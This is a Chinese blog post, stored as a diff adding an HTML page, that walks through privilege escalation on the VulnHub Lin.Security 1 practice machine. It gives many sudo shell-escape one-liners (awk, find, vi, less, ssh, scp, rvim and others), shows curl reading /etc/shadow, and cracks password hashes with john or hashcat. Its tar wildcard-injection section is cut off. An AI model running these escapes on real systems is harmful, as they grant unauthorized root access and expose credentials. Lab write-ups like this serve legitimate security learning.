@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="sovo" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      VulnHub-Lin-Security1靶机渗透学习 
+      
+      
+      |
+    
+     小小做题家
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">VulnHub-Lin-Security1靶机渗透学习</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-01-06 10:43:21
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/web/" title="web">
+                    #web
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E6%8F%90%E6%9D%83/" title="提权">
+                    #提权
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="VulnHub-Lin-Security-1-靶机渗透学习"><a href="#VulnHub-Lin-Security-1-靶机渗透学习" class="headerlink" title="VulnHub-Lin.Security: 1-靶机渗透学习"></a>VulnHub-Lin.Security: 1-靶机渗透学习</h1><h2 id="登陆账户及密码："><a href="#登陆账户及密码：" class="headerlink" title="登陆账户及密码："></a>登陆账户及密码：</h2><p>普通账户：bob&#x2F;secret</p>
+<p>root账户：root&#x2F;secret123</p>
+<h2 id="靶机网络配置："><a href="#靶机网络配置：" class="headerlink" title="靶机网络配置："></a>靶机网络配置：</h2><p>靶机网络使用netplan配置：<br>登陆root账户进行修改配置文件：</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417152303330.png" class="" title="image-20220417152749572">
+
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417152749572.png" class="" title="image-20220417152749572">
+
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417152848346.png" class="" title="image-20220417152848346">
+
+<h2 id="kalissh连接"><a href="#kalissh连接" class="headerlink" title="kalissh连接"></a>kalissh连接</h2><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417153031372.png" class="" title="image-20220417153031372">
+
+<h2 id="渗透思路及步骤"><a href="#渗透思路及步骤" class="headerlink" title="渗透思路及步骤"></a>渗透思路及步骤</h2><h3 id="nmap扫描内网"><a href="#nmap扫描内网" class="headerlink" title="nmap扫描内网"></a>nmap扫描内网</h3><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417153309177.png" class="" title="image-20220417153309177">
+
+<p>找到目标靶机</p>
+<p>经过……获取到bob权限</p>
+<h4 id="查看所拥有的权限"><a href="#查看所拥有的权限" class="headerlink" title="查看所拥有的权限"></a>查看所拥有的权限</h4><h5 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h5><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417154011664.png" class="" title="image-20220417154011664">
+
+<h3 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h3><p>一个简单的轻量级的 Shell，占用资源少，适合运行于低内存环境，但是与下面讲到的 bash shell 完全兼容。</p>
+<p>sudo ash</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417171757471.png" class="" title="image-20220417171757471">
+
+<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。</p>
+<p>sudo awk ‘BEGIN {system(“&#x2F;bin&#x2F;sh”)}’</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417171855491.png" class="" title="image-20220417171855491">
+
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>bash shell 是 Linux 的默认 shell，本教程也基于 bash 编写。bash 由 GNU 组织开发，保持了对 sh shell 的兼容性，是各种 Linux 发行版默认配置的 shell。</p>
+<p>sudo bash</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417171958476.png" class="" title="image-20220417171958476">
+
+<h3 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h3><p>sh 之后另一个广为流传的 shell 是由柏克莱大学的 Bill Joy 设计的，这个 shell 的语法有点类似C语言，所以才得名为 C shell ，简称为 csh。</p>
+<p>sudo csh</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172056539.png" class="" title="image-20220417172056539">
+
+<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称curl为下载工具。</p>
+<p>sudo curl file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172156127.png" class="" title="image-20220417172156127">
+
+<h3 id="dash"><a href="#dash" class="headerlink" title="dash"></a>dash</h3><p>原来bash是GNU&#x2F;Linux 操作系统中的 &#x2F;bin&#x2F;sh 的符号连接，但由于bash过于复杂，有人把 bash 从 NetBSD 移植到 Linux 并更名为 dash，且&#x2F;bin&#x2F;sh符号连接到dash。Dash Shell 比 Bash Shell 小的多（ubuntu16.04上，bash大概1M，dash只有150K），符合POSIX标准。Ubuntu 6.10开始默认是Dash。</p>
+<p>sudo dash</p>
+<h3 id="ed"><a href="#ed" class="headerlink" title="ed"></a>ed</h3><p>Linux ed命令是文本编辑器，用于文本编辑。</p>
+<p>ed是Linux中功能最简单的文本编辑程序，一次仅能编辑一行而非全屏幕方式的操作。</p>
+<p>ed命令并不是一个常用的命令，一般使用比较多的是vi 指令。但ed文本编辑器对于编辑大文件或对于在shell脚本程序中进行文本编辑很有用。</p>
+<p>sudo ed</p>
+<p>!&#x2F;bin&#x2F;sh</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172406412.png" class="" title="image-20220417172406412">
+
+<h3 id="env"><a href="#env" class="headerlink" title="env"></a>env</h3><p>sudo env &#x2F;bin&#x2F;sh</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172457620.png" class="" title="image-20220417172457620">
+
+<h3 id="expect"><a href="#expect" class="headerlink" title="expect"></a>expect</h3><p>expect是一个自动化交互套件，主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。</p>
+<p>sudo expect -c ‘spawn &#x2F;bin&#x2F;sh;interact’</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172650075.png" class="" title="image-20220417172650075">
+
+<p><strong>find</strong></p>
+<p>Linux find 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
+<blockquote>
+<p>sudo find . -exec &#x2F;bin&#x2F;sh ; -quit</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380447_5ffc749fe3e8a35b5dc6d.jpeg" class="" title="1610380447_5ffc749fe3e8a35b5dc6d.png!small?1610380446888">
+
+<p><strong>ftp</strong></p>
+<p>Linux ftp命令设置文件系统相关功能。</p>
+<p>FTP是ARPANet的标准文件传输协议，该网络就是现今Internet的前身。</p>
+<blockquote>
+<p>sudo ftp</p>
+<p>!&#x2F;bin&#x2F;sh</p>
+</blockquote>
+<p><strong><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380452_5ffc74a48b549c83fb370.jpeg" class="" title="1610380452_5ffc74a48b549c83fb370.png!small?1610380451433"></strong></p>
+<p><strong>Less</strong></p>
+<p>less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。</p>
+<blockquote>
+<p>sudo less &#x2F;etc&#x2F;passwd</p>
+<p>!&#x2F;bin&#x2F;sh</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380469_5ffc74b599786fbcf1733.jpeg" class="" title="1610380469_5ffc74b599786fbcf1733.png!small?1610380468485">
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380465_5ffc74b1866e12180eed1.jpeg" class="" title="1610380465_5ffc74b1866e12180eed1.png!small?1610380464451">
+
+<p><strong>Man</strong></p>
+<p>Linux提供了丰富的帮助手册，当你需要查看某个命令的参数时不必到处上网查找，只要man一下即可。可以使用man man 查看man的使用方法。</p>
+<blockquote>
+<p>Sudo man man</p>
+<p>!&#x2F;bin&#x2F;sh</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380485_5ffc74c596e85e815de8d.jpeg" class="" title="1610380485_5ffc74c596e85e815de8d.png!small?1610380484591">
+
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380479_5ffc74bfe4d03be26e06f.jpeg" class="" title="1610380479_5ffc74bfe4d03be26e06f.png!small?1610380478882">
+
+<p><strong>More</strong></p>
+<p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p>
+<blockquote>
+<p>Sudo more &#x2F;etc&#x2F;passwd</p>
+<p>!&#x2F;bin&#x2F;sh</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380492_5ffc74ccf1102ac19f51f.jpeg" class="" title="1610380492_5ffc74ccf1102ac19f51f.png!small?1610380491948">
+
+<p><strong>Scp</strong></p>
+<p>Linux scp 命令用于 Linux 之间复制文件和目录。</p>
+<p>scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。</p>
+<p>scp 是加密的，rcp 是不加密的，scp 是 rcp 的加强版。</p>
+<blockquote>
+<p>TF&#x3D;$(mktemp)</p>
+<p>echo ‘sh 0&lt;&amp;2 1&gt;&amp;2’ &gt; $TF</p>
+<p>chmod +x “$TF”</p>
+<p>sudo scp -S $TF x y:</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380499_5ffc74d3e5950e6712274.jpeg" class="" title="1610380499_5ffc74d3e5950e6712274.png!small?1610380499115">
+
+<p><strong>socat</strong></p>
+<p>socat是一个多功能的网络工具，名字来由是“Socket CAT”，可以看作是netcat的N倍加强版。</p>
+<blockquote>
+<p>sudo socat stdin exec:&#x2F;bin&#x2F;sh</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380504_5ffc74d8d2400140dbb39.jpeg" class="" title="1610380504_5ffc74d8d2400140dbb39.png!small?1610380503874">
+
+<p><strong>ssh</strong></p>
+<p>SSH(远程连接工具)连接原理：ssh服务是一个守护进程(demon)，系统后台监听客户端的连接，ssh服务端的进程名为sshd,负责实时监听客户端的请求(IP 端口)，包括公共秘钥等交换等信息。</p>
+<blockquote>
+<p>sudo ssh -o ProxyCommand&#x3D;’;sh 0&lt;&amp;2 1&gt;&amp;2’ x</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380509_5ffc74ddb9816e28e2b3b.jpeg" class="" title="1610380509_5ffc74ddb9816e28e2b3b.png!small?1610380508698">
+
+<p><strong>vi</strong></p>
+<p>vi 编辑器是 Linux&#x2F;UNIX 环境下经典的编辑器</p>
+<blockquote>
+<p>sudo vi -c ‘:!&#x2F;bin&#x2F;sh’ &#x2F;dev&#x2F;null</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380515_5ffc74e305ca796293f3b.jpeg" class="" title="1610380515_5ffc74e305ca796293f3b.png!small?1610380513939">
+
+<p><strong>zsh</strong></p>
+<p>Zsh属于Shell中的一种，但比Bash好用，而且完全兼容Bash，拥有及其丰富的插件、强大的自动补全能力、以及自定义功能，可以大大提供我们使用Linux的效率.</p>
+<blockquote>
+<p>sudo zsh</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380519_5ffc74e79dbe406a08c65.jpeg" class="" title="1610380519_5ffc74e79dbe406a08c65.png!small?1610380518544">
+
+<p><strong>pico</strong></p>
+<p>Linux pico命令用于编辑文字文件。</p>
+<p>pico是个简单易用、以显示导向为主的文字编辑程序，它伴随着处理电子邮件和新闻组的程序pine而来。</p>
+<blockquote>
+<p>sudo pico</p>
+<p>^R^X</p>
+<p>reset; sh 1&gt;&amp;0 2&gt;&amp;0</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380525_5ffc74ed766482c9f1b5f.jpeg" class="" title="1610380525_5ffc74ed766482c9f1b5f.png!small?1610380524404">
+
+<p><strong>rvim</strong></p>
+<p>改进的Vi，一个程序员的文本编辑器</p>
+<p>这需要rvim使用Python支持进行编译。前置:py3为Python 3。</p>
+<blockquote>
+<p>sudo rvim -c ‘:python3 import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-c”, “reset; exec sh”)’</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380530_5ffc74f297c1f87763a9e.jpeg" class="" title="1610380530_5ffc74f297c1f87763a9e.png!small?1610380529487">
+
+<p><strong>perl</strong></p>
+<p>Perl一种功能丰富的计算机程序语言，运行在超过100种计算机平台上，适用广泛，从最初是为文本处理而开发的，现在用于各种任务，包括系统管理，Web开发，网络编程，GUI开发等。</p>
+<p>Perl易于使用、高效、完整，而不是美观（小巧，优雅，简约）。同时支持过程和面向对象编程，对文本处理具有强大的内置支持，并且拥有第三方模块之一。 [1] Perl借取了C、sed、awk、shell脚本语言以及很多其他程序语言的特性，其中最重要的特性是它内部集成了正则表达式的功能，以及巨大的第三方代码库CPAN。</p>
+<blockquote>
+<p>sudo perl -e ‘exec “&#x2F;bin&#x2F;sh”;’</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380537_5ffc74f9ad2581fa250d8.jpeg" class="" title="1610380537_5ffc74f9ad2581fa250d8.png!small?1610380536668">
+
+<p><strong>tclsh</strong></p>
+<p>tclsh的是含有Tcl解释简单的壳体和可以读取它的标准输入或从文件Tcl命令，并评估它们。</p>
+<p>Tcl是一种脚本语言，是一种基于字符串的命令语言，是一种解释性语言。所谓解释性是指不像其他高级语言需要通过编译和联结，而与其他Shell语言一样，直接对每条语句顺序解释执行。</p>
+<blockquote>
+<p>sudo tclsh</p>
+<p>exec &#x2F;bin&#x2F;sh &lt;@stdin &gt;@stdout 2&gt;@stderr</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380549_5ffc75054cd32238b29b4.jpeg" class="" title="1610380549_5ffc75054cd32238b29b4.png!small?1610380548204">
+
+<p><strong>git</strong></p>
+<p>一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。</p>
+<blockquote>
+<p>sudo git -p help config</p>
+<p>!&#x2F;bin&#x2F;sh</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380555_5ffc750b9a9a8ca543048.jpeg" class="" title="1610380555_5ffc750b9a9a8ca543048.png!small?1610380554598">
+
+<p><strong>script</strong></p>
+<p>script 是一个神奇命令，script 能够将终端的会话过程录制下来，然后使用 scriptreplay 就可以将其录制的结果播放给他人观看。script 的好处就在于你在终端中的所有操作、敲过的命令和打印出的结果它都可以原原本本地进行录制。可以应用于教学、演示、审计。</p>
+<blockquote>
+<p>sudo script -q &#x2F;dev&#x2F;null</p>
+</blockquote>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380560_5ffc7510ae20ffff836dc.jpeg" class="" title="1610380560_5ffc7510ae20ffff836dc.png!small?1610380559659">
+
+<h2 id="hash密码破解"><a href="#hash密码破解" class="headerlink" title="hash密码破解"></a>hash密码破解</h2><p>在想在linux系统中，用户hash加密的密码存储在&#x2F;etc&#x2F;shadow中。如果我们查看&#x2F;etc&#x2F;passwd，可以看到以下内容</p>
+<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用户名</td>
+<td>用户登录系统是使用的用户名</td>
+</tr>
+<tr>
+<td>密码</td>
+<td>密码位</td>
+</tr>
+<tr>
+<td>UID</td>
+<td>用户表示号</td>
+</tr>
+<tr>
+<td>GID</td>
+<td>缺省组标识号</td>
+</tr>
+<tr>
+<td>注释性描述</td>
+<td>例如存放用户全名等信息</td>
+</tr>
+<tr>
+<td>宿主目录</td>
+<td>用户登录系统后的缺省目录</td>
+</tr>
+<tr>
+<td>命令解释器</td>
+<td>用户使用的shell，默认为bash</td>
+</tr>
+</tbody></table>
+<p>在靶机是发现passwd文件中存储hash密码</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380590_5ffc752e2d0edf9c17a75.jpeg" class="" title="1610380590_5ffc752e2d0edf9c17a75.png!small?1610380589456">
+
+<p>使用john或hashcat进行破解</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380594_5ffc7532b586adeb9df50.jpeg" class="" title="1610380594_5ffc7532b586adeb9df50.png!small?1610380593956">
+
+<p>获得账号密码</p>
+<p>insecurity&#x2F;P@ssw0rd</p>
+<h2 id="通配符提权值之tar命令注入"><a href="#通配符提权值之tar命令注入" class="headerlink" title="通配符提权值之tar命令注入"></a>通配符提权值之tar命令注入</h2><p>tar命令注入</p>
+<p>查看发现靶机中存在一个root权限的每分钟执行一次的定时任务</p>
+<img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172946052.png" class="" title="image-20220417172946052">
+
+<p>看这个脚本的内容，发现使用tar命令分别备份home下的目录</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-01-06 10:43:21
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/web/" title="web">
+                        #web
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E6%8F%90%E6%9D%83/" title="提权">
+                        #提权
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/01/07/javaWeb%E5%86%85%E5%AD%98%E9%A9%AC/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VulnHub-Lin-Security-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0"><span class="toc-text">VulnHub-Lin.Security: 1-靶机渗透学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E8%B4%A6%E6%88%B7%E5%8F%8A%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-text">登陆账户及密码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-text">靶机网络配置：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kalissh%E8%BF%9E%E6%8E%A5"><span class="toc-text">kalissh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%AD%A5%E9%AA%A4"><span class="toc-text">渗透思路及步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91"><span class="toc-text">nmap扫描内网</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-text">查看所拥有的权限</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sudo-l"><span class="toc-text">sudo -l</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ash"><span class="toc-text">ash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#awk"><span class="toc-text">awk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash"><span class="toc-text">bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csh"><span class="toc-text">csh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl"><span class="toc-text">curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dash"><span class="toc-text">dash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ed"><span class="toc-text">ed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#env"><span class="toc-text">env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#expect"><span class="toc-text">expect</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-text">hash密码破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83%E5%80%BC%E4%B9%8Btar%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">通配符提权值之tar命令注入</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
